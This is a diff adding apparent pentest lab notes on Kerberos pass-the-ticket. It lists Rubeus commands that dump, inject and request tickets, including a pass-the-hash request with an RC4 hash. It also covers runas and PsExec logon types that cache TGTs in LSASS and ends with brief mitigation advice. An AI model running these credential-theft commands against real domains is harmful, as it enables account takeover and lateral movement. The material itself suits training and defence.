@@ -1,0 +1,44 @@
+.\Rubeus.exe klist
+
+.\Rubeus.exe dump
+
+.\Rubeus.exe ptt /ticket:doIFSjCCBUagAwIBBaEDAgEWooIEQzCCBD9hg<SNIP>
+
+
+#You can Also, Pass the hash
+.\Rubeus.exe asktgt /user:student5 /domain:pentesting /rc4:602f5c34346bc946f9ac2c0922cd9ef6
+
+
+Triage All Current Tickets (If Elevated List all Users)
+.\Rubeus.exe triage
+s
+List all Current Tickets in Details (If Elevated List all Users)
+\Rubeus.exe klist
+
+runas /user:jenkinsadmin /savecred "<ProgramName> <PathToProgramFile>"
+
+--------------------
+This is a great resource on the types of Logon Types:
+
+https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material
+
+Types of Interactive Logon-Sessions
+
+Local Login: Physically Logging in at Your Workstation
+
+runas: Perhaps you are a Low Level Helpdesk who uses /runas to spawn a CMD with DA Account, this will result in a TGT for the DA account be cached in LSSAS
+
+runas /netonly: TGT will appear after running a network command (\\IP\SYSVOL) or something
+
+PsExec \\server -u user -p pwd cmd - PSExec leaves a TGT providing explicit credentials were defined
+Types of Remote-Interactive Logon Sessions
+
+Remote Desktop (RDP)
+--------------------
+
+Mitigation / Defending against PTT
+It goes without saying that defending against PTT is very tricky as you are simply using normal functions of Kerberos in a malicious way - All you are really doing is using Kerberos tickets as they would be used, TGT to request service TGS Ticket, and accessing services with TGS.
+
+However as tickets are stored in LSASS I recommend you do not log into end-users stations with privileged accounts i/e do not log into a HR User with your Domain Account with a interactive session…
+
+It is also advised to ensure that Kerberos tickets are set to expire within 10 hours.
